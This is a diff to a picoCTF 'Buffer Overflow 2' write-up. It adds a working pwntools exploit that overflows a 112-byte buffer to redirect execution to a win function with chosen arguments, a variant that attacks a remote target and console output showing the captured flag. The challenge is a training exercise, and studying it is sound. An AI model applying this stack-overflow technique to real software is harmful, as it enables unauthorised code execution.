@@ -353,7 +353,8 @@ checksec vuln
 
 ```
 
-The Hole idea is to get to win function but in order to do that we have to pass the fgets abd vuln functions.
+The Hole idea is to get to win function but in order to do that we have to pass the fgets abd vuln functions. 
+Below there's a portion of the source code and so we should perform an exploit to meet this.
 
 ``` python
 
@@ -575,6 +576,8 @@ _ni_ that we endup reaching the return address and it jumps to the main function
 
 _We should now provide the arguments 0xcafef00d and 0xf00df00d_. Got to remember the LIFO and we know that de second argument is sent first.
 
+Below source code of the vuln application
+
 ``` python
 **vuln.c**
 void win(unsigned int arg1, unsigned int arg2) {
@@ -595,9 +598,160 @@ void win(unsigned int arg1, unsigned int arg2) {
 }
 ```
 
+Below  is the source code of the exploit passing the arguments to the win function
+
+``` python
+
+#!/usr/bin/env python3
+
+import argparse
+import pwn
+
+elf=pwn.ELF("./vuln")
+p = elf.process()
+offset = 112
+# super cool function from pwn tools, so we don't
+# have to search anymore for the win function
+# pwn.p32(elf.symbols["win"])
+new_eip = pwn.p32(elf.symbols["win"])
+return_address = pwn.p32(elf.symbols["main"])
+
+payload = b"".join(
+    [
+        b"A" * 112,
+        new_eip,
+        return_address,
+        pwn.p32(0xCAFEF00D),
+        pwn.p32(0xF00DF00D),
+    ]
+)
+
+payload += b"\n"
+
+#let's create a file for the payload an open it with a file pointer
+#and let's create a breakpoint to the win function and read our payload
+with open("payload","wb") as flip:
+    flip.write(payload)
+p = elf.process()
+#Now that we tested that everything works thanks to the debugging possibility
+#with the code below
+#g = pwn.gdb.attach(
+#        p,
+#        gdbscript="""
+#        b *win
+#        r < payload
+#        """,
+#)
+#
+#And uncomment the lines below, once we finished testing with the function above
+#So we go interactive and we can see the output in console
+p.sendline(payload)
+p.interactive()
+
+```
+
+And below is the output we see in console
 
 
+``` python
+❯ python3 exploit.py
+[*] '/home/mac/CTF/picoCTF/BufferOverflow2/vuln'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process '/home/mac/CTF/picoCTF/BufferOverflow2/vuln': pid 826376
+[+] Starting local process '/home/mac/CTF/picoCTF/BufferOverflow2/vuln': pid 826382
+[*] Switching to interactive mode
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf0\xfe\xca\x04r\x93\x04witching to interactive mode                               Please enter your string
+0ffmac{plzsendmeflag}
+Please enter your string: 
+
+[*] Got EOF while reading in interactive
+$  
+
+```
+
+And we give the arguments functionality to give local, remote and the target and port\
+plus some help warning message
+
+``` python
+
+#!/usr/bin/env python3
+
+import argparse
+import pwn
+
+parser = argparse.ArgumentParser()
+parser.add_argument("destination", type=str, choices={"local","remote"})
+parser.add_argument("--target","-t", type=str, default="", required=False)
+parser.add_argument("--port","-p", type=int, default=0, required=False)
+args = parser.parse_args()
 
 
+elf=pwn.ELF("./vuln")
+p = elf.process()
+offset = 112
+new_eip = pwn.p32(elf.symbols["win"])
+return_address = pwn.p32(elf.symbols["main"])
+
+payload = b"".join(
+    [
+        b"A" * 112,
+        new_eip,
+        return_address,
+        pwn.p32(0xCAFEF00D),
+        pwn.p32(0xF00DF00D),
+    ]
+)
+
+payload += b"\n"
+
+with open("payload","wb") as flip:
+    flip.write(payload)
+
+if args.destination == "local":
+    p = elf.process()
+elif args.destination == "remote":
+    if not args.target or not args.port:
+        pwn.warning("Supply -t for target and -p for port")
+        exit()
+    p = pwn.remote(args.target, args.port)
+
+p.sendline(payload)
+p.interactive()
 
 
+```
+
+
+After running the exploit we got the goal, we finally have the exploit running remotely and we got our flag.
+
+``` python
+
+❯ python3 exploit.py remote -t saturn.picoctf.net -p 65182
+[*] '/home/mac/CTF/picoCTF/BufferOverflow2/vuln'
+[*] '/home/mac/CTF/picoCTF/BufferOverflow2/vuln'
+[*] '/home/mac/CTF/picoCTF/BufferOverflow2/vuln'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process '/home/mac/CTF/picoCTF/BufferOverflow2/vuln': pid 842055
+[+] Opening connection to saturn.picoctf.net on port 65182: Done
+[*] Switching to interactive mode
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+\xf0\xfe\xcaAAAAAAAAAAAAAAAAAAA\x96\x92\x04r\x93\x04string: 
+picoCTF{argum3nt5_4_d4yZ_31432deb}Please enter your string: 
+
+[*] Got EOF while reading in interactive
+$  
+
+```
+
+
+![image](./assets/img/BoF2_final.png)
